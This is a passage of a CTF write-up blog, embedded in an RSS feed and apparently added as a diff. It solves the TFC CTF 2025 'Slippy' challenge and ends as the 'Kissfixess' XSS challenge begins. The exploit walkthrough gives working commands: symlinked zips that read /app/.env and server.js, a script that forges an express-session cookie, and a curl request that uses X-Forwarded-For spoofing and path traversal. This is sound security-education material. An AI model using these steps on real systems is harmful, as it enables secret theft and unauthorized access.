@@ -1,0 +1,435 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ssti on</title><link>https://h4r1337.github.io/tags/ssti/</link><description>Recent content in Ssti on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 03 Sep 2025 14:47:28 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml"/><item><title>TFC CTF 2025 Writeups</title><link>https://h4r1337.github.io/posts/tfcctf-25/</link><pubDate>Wed, 03 Sep 2025 14:47:28 +0530</pubDate><guid>https://h4r1337.github.io/posts/tfcctf-25/</guid><description>&lt;p>These are writeups for some of the challenges I solved during TFCCTF 2025.&lt;/p>
+&lt;h2 id="slippy">Slippy&lt;/h2>
+&lt;blockquote>
+&lt;p>Slipping Jimmy keeps playing with Finger.&lt;/p>
+&lt;/blockquote>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903115341.webp">&lt;/figure>
+&lt;p>The server allows zip file upload. Once the user upload a zip file, it tries to extract its contents into the uploads directory.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>router.post(&lt;span style="color:#b8bb26">&amp;#39;/upload&amp;#39;&lt;/span>, upload.single(&lt;span style="color:#b8bb26">&amp;#39;zipfile&amp;#39;&lt;/span>), (req, res) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> zipPath &lt;span style="color:#fe8019">=&lt;/span> req.file.path;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> userDir &lt;span style="color:#fe8019">=&lt;/span> path.join(__dirname, &lt;span style="color:#b8bb26">&amp;#39;../uploads&amp;#39;&lt;/span>, req.session.userId);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fs.mkdirSync(userDir, { recursive&lt;span style="color:#fe8019">:&lt;/span> &lt;span style="color:#fe8019">true&lt;/span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">// Command: unzip temp/file.zip -d target_dir
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">&lt;/span> execFile(&lt;span style="color:#b8bb26">&amp;#39;unzip&amp;#39;&lt;/span>, [zipPath, &lt;span style="color:#b8bb26">&amp;#39;-d&amp;#39;&lt;/span>, userDir], (err, stdout, stderr) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fs.unlinkSync(zipPath); &lt;span style="color:#928374;font-style:italic">// Clean up temp file
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (err) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> console.error(&lt;span style="color:#b8bb26">&amp;#39;Unzip failed:&amp;#39;&lt;/span>, stderr);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> res.status(&lt;span style="color:#d3869b">500&lt;/span>).send(&lt;span style="color:#b8bb26">&amp;#39;Unzip error&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res.redirect(&lt;span style="color:#b8bb26">&amp;#39;/files&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Files inside the uploads directory is listed in the &lt;code>/files&lt;/code> endpoint:&lt;/p></description><content>&lt;p>These are writeups for some of the challenges I solved during TFCCTF 2025.&lt;/p>
+&lt;h2 id="slippy">Slippy&lt;/h2>
+&lt;blockquote>
+&lt;p>Slipping Jimmy keeps playing with Finger.&lt;/p>
+&lt;/blockquote>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903115341.webp">&lt;/figure>
+&lt;p>The server allows zip file upload. Once the user upload a zip file, it tries to extract its contents into the uploads directory.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>router.post(&lt;span style="color:#b8bb26">&amp;#39;/upload&amp;#39;&lt;/span>, upload.single(&lt;span style="color:#b8bb26">&amp;#39;zipfile&amp;#39;&lt;/span>), (req, res) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> zipPath &lt;span style="color:#fe8019">=&lt;/span> req.file.path;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> userDir &lt;span style="color:#fe8019">=&lt;/span> path.join(__dirname, &lt;span style="color:#b8bb26">&amp;#39;../uploads&amp;#39;&lt;/span>, req.session.userId);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fs.mkdirSync(userDir, { recursive&lt;span style="color:#fe8019">:&lt;/span> &lt;span style="color:#fe8019">true&lt;/span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">// Command: unzip temp/file.zip -d target_dir
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">&lt;/span> execFile(&lt;span style="color:#b8bb26">&amp;#39;unzip&amp;#39;&lt;/span>, [zipPath, &lt;span style="color:#b8bb26">&amp;#39;-d&amp;#39;&lt;/span>, userDir], (err, stdout, stderr) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fs.unlinkSync(zipPath); &lt;span style="color:#928374;font-style:italic">// Clean up temp file
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (err) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> console.error(&lt;span style="color:#b8bb26">&amp;#39;Unzip failed:&amp;#39;&lt;/span>, stderr);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> res.status(&lt;span style="color:#d3869b">500&lt;/span>).send(&lt;span style="color:#b8bb26">&amp;#39;Unzip error&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res.redirect(&lt;span style="color:#b8bb26">&amp;#39;/files&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Files inside the uploads directory is listed in the &lt;code>/files&lt;/code> endpoint:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>router.get(&lt;span style="color:#b8bb26">&amp;#39;/files&amp;#39;&lt;/span>, (req, res) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> userDir &lt;span style="color:#fe8019">=&lt;/span> path.join(__dirname, &lt;span style="color:#b8bb26">&amp;#39;../uploads&amp;#39;&lt;/span>, req.session.userId);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fs.readdir(userDir, (err, files) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (err) &lt;span style="color:#fe8019">return&lt;/span> res.status(&lt;span style="color:#d3869b">500&lt;/span>).send(&lt;span style="color:#b8bb26">&amp;#39;Error reading files&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res.render(&lt;span style="color:#b8bb26">&amp;#39;files&amp;#39;&lt;/span>, { files });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And each files inside it can be downloaded by the user:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>router.get(&lt;span style="color:#b8bb26">&amp;#39;/files/:filename&amp;#39;&lt;/span>, (req, res) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> userDir &lt;span style="color:#fe8019">=&lt;/span> path.join(__dirname, &lt;span style="color:#b8bb26">&amp;#39;../uploads&amp;#39;&lt;/span>, req.session.userId);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> requestedPath &lt;span style="color:#fe8019">=&lt;/span> path.normalize(req.params.filename);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> filePath &lt;span style="color:#fe8019">=&lt;/span> path.resolve(userDir, requestedPath);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">// Prevent path traversal
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">&lt;/span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>filePath.startsWith(path.resolve(userDir))) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> res.status(&lt;span style="color:#d3869b">400&lt;/span>).send(&lt;span style="color:#b8bb26">&amp;#39;Invalid file path&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (fs.existsSync(filePath) &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> fs.statSync(filePath).isFile()) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res.download(filePath);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#fe8019">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res.status(&lt;span style="color:#d3869b">404&lt;/span>).send(&lt;span style="color:#b8bb26">&amp;#39;File not found&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With this info we can try creating a zip file with symlinks to files like &lt;code>/etc/passwd&lt;/code> and when the server extracts the file inside the uploads directory, will point to &lt;code>/etc/passwd&lt;/code> of the server.
+We can use this technique to create a zip containing a symlink pointing to the flag in the server and read it once the server extracts our zip file. But there&amp;rsquo;s a line in the &lt;code>Dockerfile&lt;/code> that stops us from doing this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-Dockerfile" data-lang="Dockerfile">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">RUN&lt;/span> rand_dir&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;/&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>head /dev/urandom | tr -dc a-z0-9 | head -c 8&lt;span style="color:#fe8019">)&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; mkdir &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$rand_dir&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;TFCCTF{Fake_fLag}&amp;#34;&lt;/span> &amp;gt; &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$rand_dir&lt;span style="color:#b8bb26">/flag.txt&amp;#34;&lt;/span> &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> chmod -R +r &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$rand_dir&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It make sure that the &lt;code>flag.txt&lt;/code> is located in a randomly generated directory. Without knowing the name of this directory, we can&amp;rsquo;t create a proper symlink to the flag. Therefore somehow we have to leak the name of this directory to read the flag.
+There&amp;rsquo;s a &lt;code>/debug/files/&lt;/code> route which can be used to list the files in a directory:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>router.get(&lt;span style="color:#b8bb26">&amp;#39;/debug/files&amp;#39;&lt;/span>, developmentOnly, (req, res) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> userDir &lt;span style="color:#fe8019">=&lt;/span> path.join(__dirname, &lt;span style="color:#b8bb26">&amp;#39;../uploads&amp;#39;&lt;/span>, req.query.session_id);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fs.readdir(userDir, (err, files) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (err) &lt;span style="color:#fe8019">return&lt;/span> res.status(&lt;span style="color:#d3869b">500&lt;/span>).send(&lt;span style="color:#b8bb26">&amp;#39;Error reading files&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res.render(&lt;span style="color:#b8bb26">&amp;#39;files&amp;#39;&lt;/span>, { files });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can pass any path to &lt;code>session_id&lt;/code> query parameter to list the files inside that path.
+It uses a &lt;code>developmentOnly&lt;/code> middleware to checks if the session&amp;rsquo;s &lt;code>userId&lt;/code> is &amp;ldquo;develop&amp;rdquo; and the requesting IP is &lt;code>127.0.0.1&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>module.exports &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fe8019">function&lt;/span> &lt;span style="color:#fe8019">(&lt;/span>req, res, next&lt;span style="color:#fe8019">)&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> console.log&lt;span style="color:#fe8019">(&lt;/span>req.session.userId, req.ip&lt;span style="color:#fe8019">)&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">(&lt;/span>req.session.userId &lt;span style="color:#fe8019">===&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;develop&amp;#34;&lt;/span> &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> req.ip &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> next&lt;span style="color:#fe8019">()&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res.status&lt;span style="color:#fe8019">(&lt;/span>403&lt;span style="color:#fe8019">)&lt;/span>.send&lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;Forbidden: Development access only&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">}&lt;/span>;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>IP address check can be bypassed by adding an &lt;code>X-Forwarded-For: 127.0.0.1&lt;/code> header to the request. But forging a session with &lt;code>userId&lt;/code> set to &amp;ldquo;develop&amp;rdquo; is not that easy, even if we have access to the session secret.
+The app uses &lt;code>express-session&lt;/code> for session management. Session data is not stored in cookie itself, just the session ID. Session data is stored server side (by default using a &lt;code>MemoryStore&lt;/code> which will store it inside memory, but there are other compatible persistent storage methods). The client only have access to the &lt;code>connect.sid&lt;/code> cookie which consists of the session ID, signed using the session secret.
+The format of a &lt;code>connect.sid&lt;/code> is as follows:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">&amp;#39;s:&amp;#39;&lt;/span> &lt;span style="color:#fe8019">+&lt;/span> session_id &lt;span style="color:#fe8019">+&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;.&amp;#39;&lt;/span> &lt;span style="color:#fe8019">+&lt;/span> crypto.createHmac(&lt;span style="color:#b8bb26">&amp;#39;sha256&amp;#39;&lt;/span>, secret).update(val).digest(&lt;span style="color:#b8bb26">&amp;#39;base64&amp;#39;&lt;/span>).replace(&lt;span style="color:#b8bb26">/\=+$/&lt;/span>, &lt;span style="color:#b8bb26">&amp;#39;&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So even if we have the session secret, all we can control is the session ID.
+Fortunately for us a session with &lt;code>userId&lt;/code> set to &amp;ldquo;develop&amp;rdquo; is created on startup of the application:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">const&lt;/span> store &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fe8019">new&lt;/span> session.MemoryStore();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">const&lt;/span> sessionData &lt;span style="color:#fe8019">=&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cookie&lt;span style="color:#fe8019">:&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> path&lt;span style="color:#fe8019">:&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;/&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> httpOnly&lt;span style="color:#fe8019">:&lt;/span> &lt;span style="color:#fe8019">true&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> maxAge&lt;span style="color:#fe8019">:&lt;/span> &lt;span style="color:#d3869b">1000&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> &lt;span style="color:#d3869b">60&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> &lt;span style="color:#d3869b">60&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> &lt;span style="color:#d3869b">48&lt;/span> &lt;span style="color:#928374;font-style:italic">// 1 hour
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">&lt;/span> },
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> userId&lt;span style="color:#fe8019">:&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;develop&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>store.set(&lt;span style="color:#b8bb26">&amp;#39;&amp;lt;REDACTED&amp;gt;&amp;#39;&lt;/span>, sessionData, err =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (err) console.error(&lt;span style="color:#b8bb26">&amp;#39;Failed to create develop session:&amp;#39;&lt;/span>, err);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span> console.log(&lt;span style="color:#b8bb26">&amp;#39;Development session created!&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>app.use(
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> session({
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> secret&lt;span style="color:#fe8019">:&lt;/span> process.env.SESSION_SECRET,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resave&lt;span style="color:#fe8019">:&lt;/span> &lt;span style="color:#fe8019">false&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> saveUninitialized&lt;span style="color:#fe8019">:&lt;/span> &lt;span style="color:#fe8019">false&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> store&lt;span style="color:#fe8019">:&lt;/span> store,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }),
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With this info all we have to do is to leak the &lt;code>server.js&lt;/code> file to read the session ID, and leak the &lt;code>.env&lt;/code> file to read the &lt;code>SESSION_SECRET&lt;/code> and sign a new &lt;code>connect.sid&lt;/code> cookie with the session ID and secret.&lt;/p>
+&lt;h3 id="exploit">Exploit&lt;/h3>
+&lt;p>Create a symlink for files &lt;code>.env&lt;/code> and &lt;code>server.js&lt;/code> and create a zip file with these files&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ln -s /app/.env env
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ln -s /app/server.js server.js
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zip --symlinks test.zip env server.js
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Upload the zip, and download the &lt;code>env&lt;/code> and &lt;code>server.js&lt;/code> to read the session id and secret.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903133306.webp">&lt;/figure>
+&lt;p>Sign a new &lt;code>connect.sid&lt;/code> cookie using these values:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">const&lt;/span> crypto &lt;span style="color:#fe8019">=&lt;/span> require(&lt;span style="color:#b8bb26">&amp;#39;crypto&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">function&lt;/span> sign(value, secret) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> value &lt;span style="color:#fe8019">+&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;.&amp;#39;&lt;/span> &lt;span style="color:#fe8019">+&lt;/span> crypto
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .createHmac(&lt;span style="color:#b8bb26">&amp;#39;sha256&amp;#39;&lt;/span>, secret)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .update(value)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .digest(&lt;span style="color:#b8bb26">&amp;#39;base64&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .replace(&lt;span style="color:#b8bb26">/\=+$/&lt;/span>, &lt;span style="color:#b8bb26">&amp;#39;&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>console.log(&lt;span style="color:#b8bb26">&amp;#39;s:&amp;#39;&lt;/span> &lt;span style="color:#fe8019">+&lt;/span> sign(&lt;span style="color:#b8bb26">&amp;#39;session_id&amp;#39;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#39;session_secret&amp;#39;&lt;/span>));
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Send request to &lt;code>/debug/files&lt;/code> with the generated cookie:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl -ik &lt;span style="color:#b8bb26">&amp;#39;http://127.0.0.1:3000/debug/files?session_id=/../../../../&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;X-Forwarded-For: 127.0.0.1&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: connect.sid=s:session_cookie&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It will show the directory in the root, where the &lt;code>flag.txt&lt;/code> is present:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903133928.webp">&lt;/figure>
+&lt;p>Create another zip with symlink to flag:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ln -s /h8hz72zl/flag.txt flag.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zip --symlinks flag.zip flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Upload the zip and download the flag:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903134239.webp">&lt;/figure>
+&lt;h2 id="kissfixess">Kissfixess&lt;/h2>
+&lt;blockquote>
+&lt;p>Kiss My Fixes.&lt;br>
+Ain&amp;rsquo;t nobody solving this now.&lt;/p>
+&lt;/blockquote>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903135339.webp">&lt;/figure>
+&lt;p>This one is an XSS challenge. The &lt;code>input_name&lt;/code> parameter is reflected in the page. There&amp;rsquo;s a chromium bot that will visit url with the name we provide when we click the Report Name button:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">visit_url&lt;/span>(name: &lt;span style="color:#fabd2f">str&lt;/span>, timeout: &lt;span style="color:#fabd2f">int&lt;/span> &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#d3869b">30&lt;/span>):
